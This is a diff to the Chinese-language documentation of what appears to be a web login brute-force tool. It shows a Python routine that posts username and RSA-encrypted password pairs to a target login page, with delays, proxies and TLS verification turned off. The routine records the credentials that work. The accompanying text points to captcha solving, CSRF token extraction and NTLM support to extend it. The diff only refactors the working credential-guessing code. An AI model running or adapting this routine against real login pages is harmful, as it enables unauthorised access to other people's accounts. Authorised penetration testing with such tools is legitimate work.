@@ -222,25 +222,25 @@ def run(username, password): # 爆破函数，返回 (no_exception, found_passwo
 
 > `username` 和 `password` 参数可以调用前面提到的加密算法进行加密，同时也可以结合上述的验证码识别、JS函数调用等操作，项目的代码中还提供更多可能会用到的代码，如：使用Xpath获取CSRF Token、使用NTLM认证等
 
-> 代码支持设置自定义请求头和Cookies，只需要编辑、更新 `HEADERS` 和 `COOKIES` 变量即可
+> 代码支持设置自定义请求头和Cookies，只需要编辑、更新 `headers` 和 `cookies` 变量即可
 
 ```python
-
-# 设置Headers
-HEADERS = requests.utils.default_headers()
-HEADERS.update({
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
-    "Connection": "close",
-})
-
-# 设置Cookies
-COOKIES = {
-    'SESSIONID': '',
-}
 
 def run(username, password): # 爆破函数，返回 (no_exception, found_password)
 
     time.sleep(DELAY) # 延迟一段时间再爆破
+
+    # 设置Headers
+    headers = requests.utils.default_headers()
+    headers.update({
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+        "Connection": "close",
+    })
+
+    # 设置Cookies
+    cookies = {
+        'SESSIONID': '',
+    }
 
     try:
         url = "https://example.com"
@@ -251,7 +251,7 @@ def run(username, password): # 爆破函数，返回 (no_exception, found_passwo
             "password": RSA_encrypt(password)
         }
         response = session.post(url + "/login.html",
-            data=data, headers=HEADERS, cookies=COOKIES, timeout=10, 
+            data=data, headers=headers, cookies=cookies, timeout=10, 
             allow_redirects=False, verify=False, proxies=PROXIES if USE_PROXY else None)
 
         if "Login failed" in response.text:
@@ -261,17 +261,17 @@ def run(username, password): # 爆破函数，返回 (no_exception, found_passwo
             return True, False
         
         output = f"[++] {datetime.now().strftime('%H:%M:%S')} Found {username}:{password}\t\t=> code:{response.status_code} length:{len(response.content)}"
-        write_to_file(FOUND_OUTPUT_PATH, FOUND_OUTPUT_LOCK, f"{output}\n")
+        log(FOUND_PATH, FOUND_LOCK, f"{output}\n")
         print(output)
         return True, True
 
     except (ConnectTimeout, ConnectionError, ReadTimeout) as e:
-        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
+        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}")
         return False, False
 
     except Exception as e:
-        write_to_file(EXCEPTION_OUTPUT_PATH, EXCEPTION_OUTPUT_LOCK, f"{username}:{password}\n")
+        log(EXCEPTION_PATH, EXCEPTION_LOCK, f"{username}:{password}\n")
         print(f"[x] {datetime.now().strftime('%H:%M:%S')} {username}:{password} Encounter error: {e}, detail:")
         print(traceback.format_exc())
         return False, False
